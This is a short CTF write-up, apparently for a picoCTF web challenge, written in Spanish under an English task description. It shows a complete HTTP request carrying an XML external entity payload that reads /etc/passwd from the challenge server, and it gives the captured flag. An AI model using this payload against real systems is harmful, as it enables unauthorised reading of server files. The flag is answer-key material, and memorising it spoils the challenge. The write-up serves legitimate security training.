
## DESCRIPCIÓN
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

[Web Portal](http://saturn.picoctf.net:55761/)
## SOLUCIÓN
Revisamos la pagina y permite ver detalles de 3 universidades, seleccionamos cualquiera, despues en burpsuite interceptamos la peticion, observamos que es un xml, seleccionamos la peticion y la mandamos al repeater, ahi modificamos la seccion del codigo por:

```bash
POST /data HTTP/1.1
Host: saturn.picoctf.net:64157
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://saturn.picoctf.net:64157/
Content-Type: application/xml
Content-Length: 154
Origin: http://saturn.picoctf.net:64157
Connection: keep-alive
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]> <data><ID>&xxe;</ID></data>
```
y lo reenviamos, nos muestra el archivo etc passwd.

y obtenemos la flag:

picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
## NOTAS ADICIONALES

## REFERENCIAS





